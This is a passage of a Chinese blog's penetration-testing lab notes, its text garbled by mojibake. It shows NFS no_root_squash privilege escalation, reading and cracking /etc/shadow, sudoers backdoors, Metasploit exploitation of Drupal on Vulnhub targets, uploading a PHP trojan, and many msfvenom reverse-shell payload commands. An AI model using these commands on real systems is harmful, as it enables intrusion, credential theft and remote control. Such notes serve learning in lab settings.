<p>å…¶ä¸­/homeæ˜¯è¦æŒ‚è½½çš„ç›®å½•ï¼Œ*ä»£è¡¨å…è®¸è¿æ¥çš„ä¸»æœºï¼Œè¿™é‡Œæ˜¯æ‰€æœ‰ï¼Œrwæ˜¯è¯»å†™æƒé™ï¼Œno_root_squashä»£è¡¨å®¢æˆ·ç«¯å…è®¸ä»¥rootæƒé™è®¿é—®nfsã€‚</p>
<p>éšåé‡å¯ç›¸å…³æœåŠ¡ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line"># nfsé€šè¿‡rpcé€šä¿¡ï¼Œè¿™é‡ŒæŠŠrpcbindä¹Ÿé‡å¯ä¸‹sudo <span class="regexp">/etc/i</span>nit.d<span class="regexp">/rpcbind restartsudo /</span>etc<span class="regexp">/init.d/</span>nfs-kernel-server restart</span><br></pre></td></tr></table></figure></div>



<p>æ­¤æ—¶å°±é…ç½®å¥½äº†ï¼Œå¯ä»¥é€šè¿‡showmountå‘½ä»¤æ¥åˆ—å‡ºç›®æ ‡æœºçš„å…±äº«ç›®å½•ï¼Œeå‚æ•°æ˜¾ç¤ºNFSæœåŠ¡å™¨çš„è¾“å‡ºæ¸…å•ã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901231323392.png" alt="image-20220901231323392"></p>
<p>æˆ–è€…é€šè¿‡nmapçš„ç›¸å…³è„šæœ¬æ¥è¿›è¡Œæ‰«æã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901231334381.png" alt="image-20220901231334381"></p>
<h4 id="NFSé…ç½®ä¸å½“å¯ææƒ"><a href="#NFSé…ç½®ä¸å½“å¯ææƒ" class="headerlink" title="NFSé…ç½®ä¸å½“å¯ææƒ"></a><strong>NFSé…ç½®ä¸å½“å¯ææƒ</strong></h4><p>å½“nfsé…ç½®äº†è¯»å†™æƒé™ï¼Œä¸”å…è®¸å®¢æˆ·ç«¯ä»¥rootè®¿é—®æ—¶ï¼Œå°±ä¼šå­˜åœ¨å®‰å…¨éšæ‚£ã€‚æµ‹è¯•å¦‚ä¸‹ï¼š</p>
<p>é¦–å…ˆå®¢æˆ·ç«¯æŠŠç›®æ ‡æœºnfsçš„å…±äº«æŒ‚è½½åˆ°æœ¬åœ°ï¼Œç„¶åæŠŠbashå¤åˆ¶è¿›å»å¹¶èµ‹äºˆsuidæƒé™ï¼Œæ“ä½œå¦‚ä¸‹å›¾ã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901231351979.png" alt="image-20220901231351979"></p>
<p>æ­¤æ—¶ç›®æ ‡æœºçš„homeç›®å½•ä¸‹å°±ä¼šæœ‰ä¸€ä¸ªå…·æœ‰suidæƒé™çš„bashã€‚</p>
<p>æ™®é€šç”¨æˆ·æ‰§è¡Œå³å¯è·å–rootæƒé™ï¼Œè¿™é‡Œæ³¨æ„éœ€è¦åŠ ä¸Špå‚æ•°ï¼Œå¦åˆ™æƒé™è¿˜æ˜¯å½“å‰ç”¨æˆ·çš„ã€‚</p>
<p>på‚æ•°è¯´æ˜ï¼šä¸æä¾›çš„æƒ…å†µä¸‹ï¼Œæ‰“å¼€bashæƒé™æ˜¯å½“å‰å®é™…ç”¨æˆ·ï¼Œæä¾›çš„æƒ…å†µä¸‹ï¼Œä¼šæ‰“å¼€ç‰¹æƒæ¨¡å¼ï¼Œåƒä¸Šç»§æ‰¿euidï¼Œå› ä¸ºbashæœ‰suidæƒé™ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯rootã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901231410196.png" alt="image-20220901231410196"></p>
<p>ä½¿ç”¨åœºæ™¯ï¼šè¿™ä¸ªå’Œsuidææƒå¾ˆåƒï¼Œç»™ç¨‹åºèµ‹äºˆsuidæƒé™ç„¶ååˆ©ç”¨ã€‚ä¸åŒçš„æ˜¯å‰ä¸¤ç¯‡suidææƒæ˜¯å½“å‰ç”¨æˆ·ä½¿ç”¨sudo  chmodè‡ªå·±ä¿®æ”¹çš„ï¼Œåœ¨sudoersç¦ç”¨sudoå‘½ä»¤ç­‰æƒ…å†µä¸‹ï¼Œå°±è¡Œä¸é€šäº†ã€‚è€Œnfsé…ç½®åˆ©ç”¨ï¼Œæ˜¯å®¢æˆ·ç«¯æŒ‚è½½åˆ°æœ¬åœ°èµ‹æƒçš„ï¼Œç›®æ ‡æœºçš„æ™®é€šç”¨æˆ·åªéœ€æ‰§è¡Œå°±å¯ä»¥ã€‚</p>
<p>åŒç†ï¼Œä¹‹å‰æ€»ç»“çš„suidææƒçš„é‚£äº›ç¨‹åºä¹ŸåŒæ ·é€‚ç”¨ï¼Œè¿™é‡Œå°±ä¸å†è®°äº†ã€‚</p>
<h4 id="å…¶å®ƒå‘½ä»¤"><a href="#å…¶å®ƒå‘½ä»¤" class="headerlink" title="å…¶å®ƒå‘½ä»¤"></a><strong>å…¶å®ƒå‘½ä»¤</strong></h4><p>é™¤äº†å¯ä»¥ç›´æ¥å¾—åˆ°shellçš„ï¼Œè¿˜æœ‰å…¶ä»–ä¸€äº›ç¨‹åºä¸èƒ½ç›´æ¥è·å–ï¼Œä¾‹å¦‚nanoã€viç­‰ã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901231423093.png" alt="image-20220901231423093"></p>
<p>ç„¶åä½¿ç”¨nano -pæ¥è¯»å–shadowæ–‡ä»¶ï¼Œè¿™é‡Œè¯»å–æ—¶æŠŠç›¸å…³è®°å½•å¤åˆ¶å‡ºæ¥ï¼Œä½¿ç”¨johnç ´è§£ï¼Œæµ‹è¯•ä¸èƒ½é‡å®šå‘ï¼Œéœ€è¦æƒé™ï¼Œæ‰€ä»¥åªèƒ½å¤åˆ¶ã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901231435125.png" alt="image-20220901231435125"></p>
<p>å¤åˆ¶åä½¿ç”¨johnç ´è§£è·å–ç›¸å…³ç”¨æˆ·å¯†ç ï¼Œä»¥rootä¸ºä¾‹ï¼Œå¯†ç æ˜¯rootã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901231451129.png" alt="image-20220901231451129"></p>
<p>å¦‚æœå¯†ç å¤ªå¤æ‚ï¼Œç ´è§£ä¸äº†ï¼Œåˆ™å¯ä»¥å°è¯•å…¶å®ƒç”¨æˆ·ï¼Œä¾‹å¦‚æˆ‘è¿™é‡Œç›®æ ‡æœºæ˜¯aaaç”¨æˆ·ï¼Œç ´è§£aaaå¯†ç ä¸ºaaaã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901231505353.png" alt="image-20220901231505353"></p>
<p>è¿™æ—¶å€™ä¸ç¡®å®šaaaæ˜¯å¦ä¸ºrootæƒé™ï¼Œåˆ™å¯ä»¥ç»§ç»­ä½¿ç”¨nanoå»ç¼–è¾‘passwdæ–‡ä»¶ï¼Œç»™aaaèµ‹æƒã€‚</p>
<p>æŠŠåŸæ¥çš„1001æ¢æˆ0.</p>
<p><img src="/2022/05/31/daily/image-20220901231516388.png" alt="image-20220901231516388"></p>
<p>ç„¶ååˆ‡æ¢aaaç”¨æˆ·å³å¯ã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901231524654.png" alt="image-20220901231524654"></p>
<p>åˆ©ç”¨è¿™ç§æœºåˆ¶ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥ä¿®æ”¹sudoersæ–‡ä»¶ï¼Œæ·»åŠ æˆ–ä¿®æ”¹ä¸ºä»¥ä¸‹å†…å®¹ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">aaa     <span class="keyword">ALL</span>=(<span class="keyword">ALL</span>:<span class="keyword">ALL</span>) NOPASSWD:<span class="keyword">ALL</span></span><br></pre></td></tr></table></figure></div>



<p>ç„¶åä½¿ç”¨sudo bashæˆ–sudo suè·å–rootæƒé™ã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901231537204.png" alt="image-20220901231537204"></p>
<hr>
<h2 id="6-è®°å½•ä¸€ä¸‹æ‰“é¶åœºçš„æ—¶å€™ï¼Œä¸€äº›kaliå·¥å…·çš„ä½¿ç”¨"><a href="#6-è®°å½•ä¸€ä¸‹æ‰“é¶åœºçš„æ—¶å€™ï¼Œä¸€äº›kaliå·¥å…·çš„ä½¿ç”¨" class="headerlink" title="6.è®°å½•ä¸€ä¸‹æ‰“é¶åœºçš„æ—¶å€™ï¼Œä¸€äº›kaliå·¥å…·çš„ä½¿ç”¨"></a>6.è®°å½•ä¸€ä¸‹æ‰“é¶åœºçš„æ—¶å€™ï¼Œä¸€äº›kaliå·¥å…·çš„ä½¿ç”¨</h2><h3 id="1ï¼‰msf"><a href="#1ï¼‰msf" class="headerlink" title="1ï¼‰msf"></a>1ï¼‰msf</h3><h4 id="ï¼ˆ1ï¼‰msfåŸºæœ¬ä½¿ç”¨"><a href="#ï¼ˆ1ï¼‰msfåŸºæœ¬ä½¿ç”¨" class="headerlink" title="ï¼ˆ1ï¼‰msfåŸºæœ¬ä½¿ç”¨"></a>ï¼ˆ1ï¼‰msfåŸºæœ¬ä½¿ç”¨</h4><p><code>ä¸€ä¸ªæ¼æ´åˆ©ç”¨æ¡†æ¶,å¯¹è®¡ç®—æœºè½¯ä»¶æ¼æ´è¿›è¡Œæ”»å‡»</code></p>
<p><strong>è¿™é‡Œä»¥vulnhub dc1ä¸ºä¾‹</strong></p>
<p>ç»ˆç«¯è¾“å…¥<code>msfconsole</code>ï¼Œè¿›å…¥msfç•Œé¢ï¼Œæˆ–è€…èœå•ä¹Ÿå¯ä»¥æ‰“å¼€</p>
<p><img src="/2022/05/31/daily/image-20220830094506049.png" alt="image-20220830094506049"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">è¾“å…¥search drupalï¼Œæ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰drupalå¯ä»¥åˆ©ç”¨çš„è„šæœ¬</span><br><span class="line"><span class="regexp">/*å¯¹äºå…¶ä»–å‘½ä»¤ï¼Œå¯ä»¥ç”¨helpæŸ¥è¯¢*/</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220830094939297.png" alt="image-20220830094939297"></p>
<p>è¿™é‡Œå¯ä»¥é€‰æ‹©ä¸åŒçš„è„šæœ¬ï¼Œä¸‹é¢ä»¥ç¼–å·1çš„è„šæœ¬ä¸ºä¾‹ï¼Œå…¶ä»–çš„åº”è¯¥ä¹Ÿå¯ä»¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACTIONSCRIPT"><figure class="iseeu highlight /actionscript"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="keyword">use</span> <span class="number">1</span>ï¼Œè¿›å…¥ç¼–å·<span class="number">1</span>è„šæœ¬çš„è¿è¡Œç¯å¢ƒ</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220830095106784.png" alt="image-20220830095106784"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="keyword">show</span> <span class="keyword">options</span>,æŸ¥çœ‹è„šæœ¬è¿è¡Œçš„æ‰€éœ€è¦é…ç½®çš„é¡¹ç›®</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220830105519336.png" alt="image-20220830105519336"></p>
<p><code>Required</code>æ˜¯è¦æ±‚å¡«çš„ï¼Œyesæ˜¯å¿…å¡«é¡¹ï¼Œnoæ˜¯éå¿…å¡«é¡¹</p>
<p>è¿™é‡Œçš„<code>RHOSTS</code>æ²¡æœ‰å¡«ï¼Œè¿™é‡Œæ˜¯è¦æ±‚å¡«å…¥<code>target hosts</code>ä¹Ÿå°±æ˜¯ç›®æ ‡åœ°å€ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬é¶æœºçš„åœ°å€</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAMS"><figure class="iseeu highlight /gams"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="keyword">set</span> RHOSTS <span class="comment">192.168.133.136</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220830110143969.png" alt="image-20220830110143969"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">å†è¾“å…¥<span class="built_in">run</span>ï¼Œè¿è¡Œè„šæœ¬</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220830110303594.png" alt="image-20220830110303594"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">shell</span>ï¼Œè¿›å…¥<span class="built_in">shell</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220830110551273.png" alt="image-20220830110551273"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">whoami</span>ï¼ŒæŸ¥çœ‹å½“å‰çš„æƒé™</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220830110648417.png" alt="image-20220830110648417"></p>
<p>å‘ç°æ˜¯ä¸ªä½æƒé™çš„è´¦å·</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">ls</span>ï¼Œå¯ä»¥æŸ¥çœ‹åˆ°å½“å‰çš„ç›®å½•æ–‡ä»¶</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220830110825217.png" alt="image-20220830110825217"></p>
<p>ä½†æ˜¯ä¸€å †ä¸œè¥¿æŒ¤åœ¨ä¸€èµ·ï¼Œè¿˜æ˜¯æœ‰äº›ä¸å¤ªæ–¹ä¾¿</p>
<p><strong>è¾“å…¥ä¸‹æ–¹æŒ‡ä»¤ï¼Œåˆ©ç”¨pythonè¿›å…¥äº¤äº’å¼shellã€å›ºå®šå§¿åŠ¿ï¼Œè¦è®°ä½ã€‘</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220830110907408.png" alt="image-20220830110907408"></p>
<h4 id="ï¼ˆ2ï¼‰msfåé—¨ç”Ÿæˆæ¨¡å—"><a href="#ï¼ˆ2ï¼‰msfåé—¨ç”Ÿæˆæ¨¡å—" class="headerlink" title="ï¼ˆ2ï¼‰msfåé—¨ç”Ÿæˆæ¨¡å—"></a>ï¼ˆ2ï¼‰msfåé—¨ç”Ÿæˆæ¨¡å—</h4><h5 id="æ™®é€šç”Ÿæˆ"><a href="#æ™®é€šç”Ÿæˆ" class="headerlink" title="æ™®é€šç”Ÿæˆ"></a>æ™®é€šç”Ÿæˆ</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">msfvenom -p æœ‰æ•ˆè½½è· -f è¾“å‡ºæ ¼å¼ -o è¾“å‡ºæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">msfvenom -p windows<span class="regexp">/meterpreter/</span>reverse_tcp -f exe -o payload.exe</span><br></pre></td></tr></table></figure></div>

<h5 id="ç¼–ç ç”Ÿæˆ"><a href="#ç¼–ç ç”Ÿæˆ" class="headerlink" title="ç¼–ç ç”Ÿæˆ"></a>ç¼–ç ç”Ÿæˆ</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -a ç³»ç»Ÿæ¶æ„ --platform ç³»ç»Ÿå¹³å° -p æœ‰æ•ˆè½½è· <span class="attribute">lhost</span>=æ”»å‡»æœºIP <span class="attribute">lport</span>=æ”»å‡»æœºç«¯å£ -e ç¼–ç æ–¹å¼ -iç¼–ç æ¬¡æ•° -f è¾“å‡ºæ ¼å¼ -o è¾“å‡ºæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp <span class="attribute">lhost</span>=192.168.1.1 <span class="attribute">lport</span>=8888 -i 3 -e x86/shikata_ga_nai -f exe -o payload.exe</span><br></pre></td></tr></table></figure></div>

<h5 id="ä»¥DC-3ä¸¾ä¸ªä¾‹å­"><a href="#ä»¥DC-3ä¸¾ä¸ªä¾‹å­" class="headerlink" title="*ä»¥DC-3ä¸¾ä¸ªä¾‹å­"></a>*ä»¥DC-3ä¸¾ä¸ªä¾‹å­</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">è¾“å…¥msfvenom -p php<span class="regexp">/meterpreter/</span>reverse_tcp LHOST=kaliçš„ip LPORT=<span class="number">4444</span> -f raw &gt; shell.php</span><br><span class="line"><span class="regexp">//</span>æ³¨æ„ï¼ŒLHOSTæ˜¯kaliçš„ip</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220903222910397.png" alt="image-20220903222910397"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">ls</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220903144052531.png" alt="image-20220903144052531"></p>
<p>å‘ç°ç›®å½•ä¸‹ç”Ÿæˆäº† <code>shell.php</code></p>
<p><img src="/2022/05/31/daily/image-20220903223007361.png" alt="image-20220903223007361"></p>
<p>ç„¶ååœ¨ç½‘ç«™æ–°å»ºä¸€ä¸ªphpæ–‡ä»¶</p>
<p><img src="/2022/05/31/daily/image-20220903221140645.png" alt="image-20220903221140645"></p>
<p>ç„¶åæŠŠæœ¨é©¬å†…å®¹å¯¼å…¥è¿›å»</p>
<p><img src="/2022/05/31/daily/image-20220903223039265.png" alt="image-20220903223039265"></p>
<p>ç„¶åä¿å­˜ä¸€ä¸‹</p>
<p><img src="/2022/05/31/daily/image-20220903221238918.png" alt="image-20220903221238918"></p>
<p>ç„¶åè¯•è¯•èƒ½ä¸èƒ½è®¿é—®æœ¨é©¬</p>
<p>ç„¶åæˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°æœ¨é©¬æ–‡ä»¶è·¯å¾„ï¼Œè¿›è¡Œè®¿é—®çœ‹çœ‹ï¼Œèƒ½ä¸èƒ½è®¿é—®æˆåŠŸ</p>
<p>å› ä¸ºæˆ‘ä»¬æ–‡ä»¶æ˜¯åœ¨<code>/templates/protostar/less/</code>ä¸‹ä¸Šä¼ çš„ï¼Œæ‰€ä»¥è®¿é—®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar<span class="regexp">/less/</span><span class="number">1</span>.php</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220903221336853.png" alt="image-20220903221336853"></p>
<p>çœ‹åˆ°/*ï¼Œçœ‹æ¥æ˜¯å¯ä»¥æˆåŠŸè®¿é—®</p>
<h6 id="msfåˆ©ç”¨æœ¨é©¬"><a href="#msfåˆ©ç”¨æœ¨é©¬" class="headerlink" title="msfåˆ©ç”¨æœ¨é©¬"></a>msfåˆ©ç”¨æœ¨é©¬</h6><p>ç„¶åç”¨msfè¿›è¡Œåˆ©ç”¨</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">å…ˆè¾“å…¥msfconsoleï¼Œè¿›å…¥msf</span><br></pre></td></tr></table></figure>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">ç„¶åè¾“å…¥</span><br><span class="line">use exploit<span class="regexp">/multi/</span>handler</span><br><span class="line"></span><br><span class="line">set payload php<span class="regexp">/meterpreter/</span>reverse_tcp</span><br><span class="line">è¿›å…¥æˆ‘ä»¬åˆ©ç”¨msfåˆ¶ä½œçš„æœ¨é©¬åˆ©ç”¨ç¯å¢ƒ</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220903220102252.png" alt="image-20220903220102252"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="keyword">show</span> <span class="keyword">options</span></span><br><span class="line">çœ‹çœ‹éœ€è¦å¡«å†™ä»€ä¹ˆ</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220903220250819.png" alt="image-20220903220250819"></p>
<p>çœ‹åˆ°LHOSTç›‘å¬çš„ipæ²¡æœ‰å¡«å†™</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAMS"><figure class="iseeu highlight /gams"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="keyword">set</span> LHOST <span class="comment">192.168.133.140</span> //<span class="comment">kali</span>çš„<span class="comment">ip</span></span><br></pre></td></tr></table></figure></div>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">run</span>ï¼Œè¿è¡Œï¼Œä¼šå¡ä½</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œå°±æ˜¯åœ¨ç­‰å¾…æˆ‘ä»¬çš„æœ¨é©¬è¿è¡Œï¼Œæˆ‘ä»¬åªéœ€è¦åˆ·æ–°ä¸€ä¸‹æˆ‘ä»¬ä¹‹å‰è®¿é—®æœ¨é©¬çš„ç½‘é¡µ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220903223414089.png" alt="image-20220903223414089"></p>
<p>åé¢æ“ä½œä¸èµ˜è¿°</p>
<h5 id="msfvenom-â€”list-archs"><a href="#msfvenom-â€”list-archs" class="headerlink" title="msfvenom â€”list archs"></a>msfvenom â€”list archs</h5><p>#æŸ¥çœ‹æ”¯æŒçš„ç³»ç»Ÿæ¶æ„</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">aarch<span class="number">64</span><span class="punctuation">,</span> armbe<span class="punctuation">,</span> armle<span class="punctuation">,</span> cbea<span class="punctuation">,</span> cbea<span class="number">64</span><span class="punctuation">,</span> cmd<span class="punctuation">,</span> dalvik<span class="punctuation">,</span> firefox<span class="punctuation">,</span> java<span class="punctuation">,</span> mips<span class="punctuation">,</span> mips<span class="number">64</span><span class="punctuation">,</span> mips<span class="number">64</span>le<span class="punctuation">,</span> mipsbe<span class="punctuation">,</span> mipsle<span class="punctuation">,</span> nodejs<span class="punctuation">,</span> php<span class="punctuation">,</span> ppc<span class="punctuation">,</span> ppc<span class="number">64</span><span class="punctuation">,</span> ppc<span class="number">64</span>le<span class="punctuation">,</span> ppce<span class="number">500</span>v<span class="number">2</span><span class="punctuation">,</span> python<span class="punctuation">,</span> r<span class="punctuation">,</span> ruby<span class="punctuation">,</span> sparc<span class="punctuation">,</span> sparc<span class="number">64</span><span class="punctuation">,</span> tty<span class="punctuation">,</span> <span class="keyword">x</span><span class="number">64</span><span class="punctuation">,</span> <span class="keyword">x</span><span class="number">86</span><span class="punctuation">,</span> <span class="keyword">x</span><span class="number">86</span>_<span class="number">64</span><span class="punctuation">,</span> zarch</span><br></pre></td></tr></table></figure></div>

<h5 id="msfvenom-â€”list-platforms"><a href="#msfvenom-â€”list-platforms" class="headerlink" title="msfvenom â€”list platforms"></a>msfvenom â€”list platforms</h5><p>#æŸ¥çœ‹æ”¯æŒç³»ç»Ÿå¹³å°</p>
<pre><code>aix, android, apple_ios, bsd, bsdi, cisco, firefox, freebsd, hardware, hpux, irix, java, javascript, juniper, linux, mainframe, multi, netbsd, netware, nodejs, openbsd, osx, php, python, r, ruby, solaris, unifi, unix, unknown, windows



msfvenom -l payload #åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„payload

msfvenom -l formats #åˆ—å‡ºæ‰€æœ‰çš„è¾“å‡ºæ ¼å¼

msfvenom -l encrypt #åˆ—å‡ºæ‰€æœ‰çš„åŠ å¯†æ–¹å¼

msfvenom -l encoders #åˆ—å‡ºæ‰€æœ‰çš„ç¼–ç å™¨
</code></pre>
<h5 id="å¸¸è§ç”Ÿæˆæ ¼å¼"><a href="#å¸¸è§ç”Ÿæˆæ ¼å¼" class="headerlink" title="å¸¸è§ç”Ÿæˆæ ¼å¼"></a>å¸¸è§ç”Ÿæˆæ ¼å¼</h5><h6 id="1ã€-Windows"><a href="#1ã€-Windows" class="headerlink" title="1ã€ Windows"></a>1ã€ Windows</h6><pre><code>msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -f exe -o payload.exe
</code></pre>
<h6 id="2ã€Linux"><a href="#2ã€Linux" class="headerlink" title="2ã€Linux"></a>2ã€Linux</h6><pre><code>msfvenom --platform linux -a x86 -p linux/x86/meterpreter/reverse_tcp -f elf -o payload.elfxxxxxxxxxxÂ msfvenom --platform linux -a x86 -p linux/x86/meterpreter/reverse_tcp -f elf -o payload.elf1
</code></pre>
<h6 id="3ã€Mac"><a href="#3ã€Mac" class="headerlink" title="3ã€Mac"></a>3ã€Mac</h6><pre><code>msfvenom --platform osx -a x86 -p osx/x86/shell_reverse_tcp -f macho -o payload.macho
</code></pre>
<h6 id="4ã€Android"><a href="#4ã€Android" class="headerlink" title="4ã€Android"></a>4ã€Android</h6><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">msfvenom -p android<span class="regexp">/meterpreter/</span>reverse_tcp -o payload.apk</span><br></pre></td></tr></table></figure></div>

<h6 id="5ã€Aspx"><a href="#5ã€Aspx" class="headerlink" title="5ã€Aspx"></a>5ã€Aspx</h6><pre><code>msfvenom --platform windows-p windows/meterpreter/reverse_tcp -f aspx -o payload.aspx
</code></pre>
<h6 id="6ã€JSP"><a href="#6ã€JSP" class="headerlink" title="6ã€JSP"></a>6ã€JSP</h6><pre><code>msfvenom --platform java -p java/jsp_shell_reverse_tcp -f raw -o payload.jsp
</code></pre>
<h6 id="7ã€PHP"><a href="#7ã€PHP" class="headerlink" title="7ã€PHP"></a>7ã€PHP</h6><pre><code>msfvenom -p php/meterpreter_reverse_tcp -f raw -o payload.php
</code></pre>
<h6 id="8ã€BASH"><a href="#8ã€BASH" class="headerlink" title="8ã€BASH"></a>8ã€BASH</h6><pre><code>msfvenom -p cmd/unix/reverse_bash -f raw -o shell.sh
</code></pre>
<h6 id="9ã€Python"><a href="#9ã€Python" class="headerlink" title="9ã€Python"></a>9ã€Python</h6><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">msfvenom -<span class="keyword">p</span> <span class="keyword">python</span>/meterpreter/reverse_tcp -<span class="keyword">f</span> raw -<span class="keyword">o</span> <span class="keyword">shell</span>.<span class="keyword">py</span></span><br></pre></td></tr></table></figure></div>



